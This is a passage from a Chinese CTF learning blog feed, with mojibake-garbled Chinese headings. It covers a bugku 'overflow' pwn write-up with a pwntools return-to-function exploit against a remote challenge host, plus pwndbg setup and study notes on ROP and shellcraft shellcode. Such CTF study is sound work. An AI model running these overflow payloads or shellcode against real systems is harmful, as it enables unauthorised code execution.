0x7fffffffe140<br>112<br>&gt;&gt;&gt;<br><br></code></pre></td></tr></table></figure><h2 id="æ‰¾å­—ç¬¦ä¸²çš„åœ°å€"><a href="#æ‰¾å­—ç¬¦ä¸²çš„åœ°å€" class="headerlink" title="æ‰¾å­—ç¬¦ä¸²çš„åœ°å€"></a>æ‰¾å­—ç¬¦ä¸²çš„åœ°å€</h2><h3 id="æ–¹æ³•1ï¼šROPgadget"><a href="#æ–¹æ³•1ï¼šROPgadget" class="headerlink" title="æ–¹æ³•1ï¼šROPgadget"></a>æ–¹æ³•1ï¼šROPgadget</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">å‘½ä»¤: ROPgadget --binary æ–‡ä»¶å --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>å‘½ä»¤: ROPgadget --binary æ–‡ä»¶å --string <span class="hljs-string">&#x27;/sh&#x27;</span><br>å‘½ä»¤: ROPgadget --binary æ–‡ä»¶å --string <span class="hljs-string">&#x27;sh&#x27;</span><br>å‘½ä»¤: ROPgadget --binary æ–‡ä»¶å --string <span class="hljs-string">&#x27;cat flag&#x27;</span><br>å‘½ä»¤: ROPgadget --binary æ–‡ä»¶å --string <span class="hljs-string">&#x27;cat flag.txt&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¼špython"><a href="#æ–¹æ³•2ï¼špython" class="headerlink" title="æ–¹æ³•2ï¼špython"></a>æ–¹æ³•2ï¼špython</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816221033.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816221522.png" alt="image.png"></p><h3 id="æ–¹æ³•3ï¼šida"><a href="#æ–¹æ³•3ï¼šida" class="headerlink" title="æ–¹æ³•3ï¼šida"></a>æ–¹æ³•3ï¼šida</h3><p>ida  shift+F12 è·³åˆ°å­—ç¬¦ä¸²</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘bugku pwnç±»å‹</title>
    <link href="/2023/08/16/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91bugku%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/16/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91bugku%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h1><h2 id="checksecæ£€æŸ¥"><a href="#checksecæ£€æŸ¥" class="headerlink" title="checksecæ£€æŸ¥"></a>checksecæ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># checksec pwn2</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/bugku/01-overflow/pwn2&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br>[root@ningan 01-overflow]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;say something?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh,that&#x27;s so boring!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821143154.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821143106.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_shell_</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tql~tql~tql~tql~tql~tql~tql&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is your flag!&quot;</span>);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æï¼šæŸ¥çœ‹å‡½æ•°åœ°å€"><a href="#idaåˆ†æï¼šæŸ¥çœ‹å‡½æ•°åœ°å€" class="headerlink" title="idaåˆ†æï¼šæŸ¥çœ‹å‡½æ•°åœ°å€"></a>idaåˆ†æï¼šæŸ¥çœ‹å‡½æ•°åœ°å€</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232005.png" alt="image.png"></p><h2 id="gdbåˆ†æï¼šæŸ¥çœ‹åç§»"><a href="#gdbåˆ†æï¼šæŸ¥çœ‹åç§»" class="headerlink" title="gdbåˆ†æï¼šæŸ¥çœ‹åç§»"></a>gdbåˆ†æï¼šæŸ¥çœ‹åç§»</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232100.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230816232126.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x1a0 - 0x170<br>48<br><br><br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">[root@ningan 01-overflow]<span class="hljs-comment"># cat exp.py</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&quot;./pwn2&quot;)</span><br>io = remote(<span class="hljs-string">&quot;114.67.175.224&quot;</span>, <span class="hljs-number">18554</span>)<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">48</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span> + p64(<span class="hljs-number">0x0000000000400751</span>)<br><br>io.recvline()<br><span class="hljs-comment"># io.recvline()</span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="æœ€ç»ˆç»“æœ"><a href="#æœ€ç»ˆç»“æœ" class="headerlink" title="æœ€ç»ˆç»“æœ"></a>æœ€ç»ˆç»“æœ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 01-overflow]<span class="hljs-comment"># python exp.py</span><br>[+] Opening connection to 114.67.175.224 on port 18554: Done<br>[*] Switching to interactive mode<br>oh,that<span class="hljs-string">&#x27;s so boring!</span><br><span class="hljs-string">tql~tql~tql~tql~tql~tql~tql</span><br><span class="hljs-string">this is your flag!</span><br><span class="hljs-string">flag&#123;99kls08s6d5a73bcd&#125;</span><br><span class="hljs-string">[*] Got EOF while reading in interactive</span><br><span class="hljs-string">$</span><br><span class="hljs-string">$</span><br><span class="hljs-string">[*] Closed connection to 114.67.175.224 port 18554</span><br><span class="hljs-string">[*] Got EOF while sending in interactive</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfå·¥å…·ç³»åˆ—ã€‘pwndbgå®‰è£…</title>
    <link href="/2023/08/16/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91pwndbg%E5%AE%89%E8%A3%85/"/>
    <url>/2023/08/16/ctf/%E3%80%90ctf%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E3%80%91pwndbg%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>sudo <span class="hljs-comment">#./setup.sh</span><br></code></pre></td></tr></table></figure><p>åœ¨ubuntu18.04ä¸Šæ­»æ´»è£…ä¸ä¸Šï¼Œåœ¨kaliä¸Šç›´æ¥å°±è£…ä¸Šäº†<br>æ„Ÿè§‰æ˜¯å› ä¸ºubuntu18.04ä¸Šé¢çš„ä¸€äº›å®‰è£…åŒ…æœ‰å†²çªï¼Œè€Œkaliçš„ç¯å¢ƒæ¯”è¾ƒå¹²å‡€</p><p>kaliçš„ç³»ç»Ÿå‚æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/pwndbg]<br>â””â”€<span class="hljs-comment"># uname -a</span><br>Linux kali 6.3.0-kali1-amd64 <span class="hljs-comment">#1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux</span><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/pwndbg]<br>â””â”€<span class="hljs-comment"># cat /etc/os-release</span><br>PRETTY_NAME=<span class="hljs-string">&quot;Kali GNU/Linux Rolling&quot;</span><br>NAME=<span class="hljs-string">&quot;Kali GNU/Linux&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;2023.2&quot;</span><br>VERSION=<span class="hljs-string">&quot;2023.2&quot;</span><br>VERSION_CODENAME=kali-rolling<br>ID=kali<br>ID_LIKE=debian<br>HOME_URL=<span class="hljs-string">&quot;https://www.kali.org/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://forums.kali.org/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.kali.org/&quot;</span><br>ANSI_COLOR=<span class="hljs-string">&quot;1;31&quot;</span><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/pwndbg]<br>â””â”€<span class="hljs-comment"># python --version</span><br>Python 3.11.4<br><br><br></code></pre></td></tr></table></figure><p>kaliå®‰è£…ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/pwndbg]<br>â””â”€<span class="hljs-comment"># gdb</span><br>GNU gdb (Debian 13.2-1) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type <span class="hljs-string">&quot;show copying&quot;</span> and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.<br>Type <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For <span class="hljs-built_in">help</span>, <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br>Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>.<br>pwndbg: loaded 147 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] <span class="hljs-keyword">for</span> a list.<br>pwndbg: created <span class="hljs-variable">$rebase</span>, <span class="hljs-variable">$ida</span> GDB <span class="hljs-built_in">functions</span> (can be used with <span class="hljs-built_in">print</span>/break)<br>------- tip of the day (<span class="hljs-built_in">disable</span> with <span class="hljs-built_in">set</span> show-tips off) -------<br>The <span class="hljs-built_in">set</span> show-flags on setting will display CPU flags register <span class="hljs-keyword">in</span> the regs context panel<br>pwndbg&gt;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘pwnå­¦ä¹ </title>
    <link href="/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></p><p>bç«™è§†é¢‘æ•™ç¨‹ï¼š<a href="https://www.bilibili.com/video/BV1mb411R7LR/?p=92&spm_id_from=pageDriver&vd_source=504b7dbe5398664dd37d144b1bdfc0a1">ã€CTFç³»åˆ—æ•™ç¨‹100é›†ã€‘2023å¹´æˆ‘åœ¨Bç«™å­¦CTFï¼Œå›½å†…é¡¶çº§æˆ˜é˜Ÿå¤§ä½¬å¸¦ä½ ä»å…¥é—¨åˆ°ç²¾é€šï¼Œé›¶åŸºç¡€å°ç™½å¿…çœ‹ï¼ï¼ï¼</a></p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc ip port<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814203631.png" alt="image.png"></p><p>æ”»å‡»è„šæœ¬æŒ‰ç…§ä¸€å®šçš„æ–¹å¼å‘é€ä¸€ä¸ªpayload</p><p>ç£ç›˜ä¸­çš„æ‰å«ELF<br>file a.outæ˜¯ä¸€ä¸ªELFæ–‡ä»¶</p><p>èŠ‚è§†å›¾ åˆ’åˆ†åŠŸèƒ½<br>æ®µè§†å›¾ åˆ’åˆ†æ‰§è¡Œæƒé™çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814210726.png" alt="image.png"></p><p>rodata   read only data<br>cat &#x2F;proc&#x2F;pid&#x2F;maps    procè¡¨ç¤ºprocess</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211056.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211232.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211647.png" alt="image.png"></p><p>gdbè°ƒçš„æ˜¯è™šæ‹Ÿå†…å­˜</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814212047.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814214700.png" alt="image.png"><br>BSSï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡  ä¸éœ€è¦å ç”¨ç£ç›˜ç©ºé—´ éœ€è¦å æ®å†…å­˜ç©ºé—´</p><p>pwnçš„å®æˆ˜ä¸­å¤§æ®µåºä¸€èˆ¬ä¸å¤š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814220115.png" alt="image.png"></p><p>eaxï¼šeè¡¨ç¤ºextra    </p><p>LSBå°ç«¯åº</p><p>fork å¦èµ·äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹  </p><p>å–å€¼-è¯‘ç -æ‰§è¡Œ</p><p>åç§»å’Œä½ç§» </p><p>æ±‡ç¼–  DEST &lt;- DEST SRC ï¼Ÿ</p><p>checksec xxx</p><p>gdb xxx<br>vmmap</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>mov ebp esp<br>mov esp ebp<br>æŠŠespçš„å€¼ç»™ebp</p><p>eaxä¿å­˜è¿”å›åœ°å€</p><p>callæŒ‡ä»¤è‡ªå¸¦å¡«å…¥è¿”å›åœ°å€</p><p>ret æŒ‡ä»¤ ï¼Ÿ</p><p>pwntools  pythonçš„ä¸€ä¸ªæ¨¡å—<br>gdbä¸­çš„æ’ä»¶ï¼špeda gef pwndbg<br>checksec a.out å‘½ä»¤è¡Œå·¥å…·</p><p>IDAè½¯ä»¶ï¼š</p><p>LibcSearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&quot;./xxx&quot;</span>)<br>io=remote(<span class="hljs-string">&quot;ipåœ°å€&quot;</span>ï¼Œ ç«¯å£)<br><br>io.recvline()<br>io.recv()<br><br>io.send(p64())<br>io.send(p32(<span class="hljs-number">0</span>))<br>io.send(<span class="hljs-string">b&quot;\x0a&quot;</span>) <span class="hljs-comment"># byteå¯¹è±¡</span><br>io.sendline(<span class="hljs-string">b&quot;abcd&quot;</span>)   &lt;=&gt; io.send(<span class="hljs-string">b&quot;abcd\n&quot;</span>) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(-x8048522)<br>io.sendline(payload) <br>io.interactive()<br></code></pre></td></tr></table></figure><p>ret2text è¿”å›åˆ°testæ®µ</p><p>checksecæ‰§è¡Œç»“æœï¼š<br>NXï¼šæ ˆå¯æ‰§è¡Œ</p><p>setbuf(stdin,0) å…³é—­ç¼“å†²åŒºï¼Œå¯ä»¥å°†è¾“å…¥çš„å­—ç¬¦ä¸²ç›´æ¥æ‰“å°å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b *0x8048<br>pwndbg&gt; b main<br>pwndbg&gt; r <span class="hljs-comment"># run</span><br>pwndbg&gt; s <span class="hljs-comment"># stag in?</span><br>pwndbg&gt; n<br>AAAAA<br>pwndbg&gt; stack 24<br>pwndbg&gt; vmmap<br>pwndbg&gt; <br>pwndbg&gt; <br><br></code></pre></td></tr></table></figure><p>æ ˆçš„ä¿æŠ¤æœºåˆ¶ï¼š<br>ASLR åœ°å€éšæœºåŒ–<br>NX<br>canary</p><p>è·å–shellcodeçš„æ–¹æ³•ï¼š<br>1ï¼‰pwnæœ‰æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.sh() <span class="hljs-comment"># 32ä½æœºå™¨</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(shellcraft.sh())   <span class="hljs-comment"># è¾“å‡ºæ±‡ç¼–</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(asm(shellcraft.sh())) <span class="hljs-comment"># è½¬æˆäºŒè¿›åˆ¶</span><br><br><span class="hljs-comment">########################################  64ä½</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.amd64.sh() <span class="hljs-comment"># 64ä½æœºå™¨</span><br></code></pre></td></tr></table></figure><p>leave   è¡¨ç¤ºæŠŠespç§»åˆ°ebpçš„ä½ç½®<br>pop<br>ret ???????&#x2F;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0x1111111</span> - <span class="hljs-number">0x000123</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(xxxx)<br><br>ljust ä»å·¦å‘å³æœ‰è°ƒæ•´ï¼Œä¸å¤Ÿä½æ•°çš„ç”¨å­—ç¬¦è¡¥é½<br>asm(shellcraft.sh()).ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + P32(0xxxxxxxxx)<br></code></pre></td></tr></table></figure><h2 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xd0</span>-<span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>ROP   æ˜¯å› ä¸ºæ²¡æœ‰ä¸€ä¸ªç°æˆçš„å‡½æ•°å¯ä¾›è°ƒç”¨ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±æ„é€ </p><p>ida   åœ¨æ±‡ç¼–é‚£ä¸ªåŒºåŸŸ è¾“å…¥Gï¼Œç„¶åè¾“å…¥åœ°å€ï¼Œç›´æ¥å°±èƒ½è·³è½¬<br>ida shift+F12 è·³åˆ°å­—ç¬¦ä¸²</p><p>retç­‰æ•ˆäº pop EIP<br>xor %eax, %eax å°†eaxæ¸…ç©º<br>mov %eax, (%edx)   åŠ %æ˜¯åè€…ç»™å‰è€…èµ‹å€¼</p><h3 id="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥"></a>é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817134717.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-pie -o xx test.c<br>gcc -fno-pie --static -o xx test.c<br><br>gcc -fno-pie  -g -m32 -o xx test.c<br><span class="hljs-comment"># fno-pie å…³é—­32</span><br><span class="hljs-comment"># -g åŠ ä¸Šæºä»£ç </span><br><span class="hljs-comment"># -m32 ç¼–è¯‘æˆ32ä½</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133627.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133659.png" alt="image.png"></p><p>é™æ€é“¾æ¥æ–‡ä»¶è¾ƒå¤§   é™æ€æ–‡ä»¶å’ŒåŠ¨æ€æ–‡ä»¶å¤§å°å·®è·åœ¨äºåº“å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817135253.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; plt<br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br></code></pre></td></tr></table></figure><h2 id="day4"><a href="#day4" class="headerlink" title="day4"></a>day4</h2><p>pltåœ¨ä»£ç æ®µ<br>got     global offset table</p><p>ret2text   æ‰¾åé—¨å‡½æ•°<br>ret2shellcode<br>ret2syscalläºŒè¿›åˆ¶ç”¨çš„æ˜¯é™æ€é“¾æ¥   é™æ€ å°†åº“å‡½æ•°å†™åˆ°äº†elfæ–‡ä»¶æœ¬èº«  ä»£ç ä¼šæ¯”è¾ƒå¤š å°±å¯ä»¥å¾ˆå®¹æ˜“çš„æ„æˆä¸€ä¸ªæ”»å‡»æµ<br>ret2libc pltè¡¨ä¸­å­˜åœ¨systemï¼Œå¾ˆæœ‰åˆ©</p><p>pltæ˜¯ä¸€ä¸ªè¡¨ï¼Œè¡¨é‡Œé¢ä¿å­˜çš„æ˜¯ä»£ç <br>got.plté‡Œé¢ä¿å­˜çš„æ˜¯æ•°æ®ï¼Œé‡Œé¢ä¿å­˜çš„æ˜¯åœ°å€</p><p>å‡è®¾<br>0xaaaaaaaa      system@got</p><p>32æ˜¯æ ˆä¼ é€’ 